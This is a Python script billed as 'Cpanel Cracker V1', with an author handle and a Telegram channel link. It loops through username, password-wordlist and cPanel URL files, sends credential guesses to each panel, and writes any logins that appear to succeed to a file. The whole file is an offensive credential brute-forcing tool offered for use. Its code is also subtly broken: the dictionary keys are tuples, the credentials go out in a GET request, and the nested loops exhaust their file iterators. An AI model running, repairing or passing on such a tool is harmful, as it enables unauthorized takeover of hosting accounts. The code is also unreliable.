wel2 = """
+----------------------------------------------+
| Name:        Cpanel Cracker V1
| Author:      ShadowOfBlood
| Telegram Channel : https://t.me/Shadow_Of_Blood
+----------------------------------------------+
"""


import os
import sys
import requests
from sys import platform
import time

if sys.platform.startswith('win32'):
    os.system("cls")
if sys.platform.startswith('linux'):
   os.system("clear")
if sys.platform.startswith('linux2'):
    os.system("clear")
if sys.platform.startswith('unix'):
    os.system("clear")

for i in wel2:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)



userlist = input("Enter the Cpanel Userlist: ")
users = open(userlist,"r")

passwordlist = input("Enter the wordlist name and path : ")
passwrds = open(passwordlist,"r")

login = input("Enter the cpanel lists")
cpanels = open(login,"r")

for cpanel in cpanels:
    for user in users:
        for passwrd in passwrds:
            usrs = "usr","user","id","identifient","nom d'utilisateur","login"
            passwds = "pass","passwrd","password","passwd","motdepass","mdp","mot de pass"
            brute = {usrs:user , passwds: passwrd}
            r = requests.get(cpanel,data=brute,allow_redirects=False,timeout=999999)
            CPMarks = "GENERAL INFORMATION","Current User","FILES","File Manager"
            for CPMark in CPMarks:
                if CPMark in r.content:
                    print ("CP Cracked//User:"+user+"//Pass:"+passwrd+"//CPURL:"+cpanel)
                    print ("All Working CPs will be saved in Working_Cpanel.txt")
                    open('Working_Cpanel.txt', 'a').write("\nCP Found//User:"+user+"//Pass:"+passwrd+"//CPURL:"+cpanel+"By ShadowOfBlood\n")
                else:
                    print ("CP Not Cracked")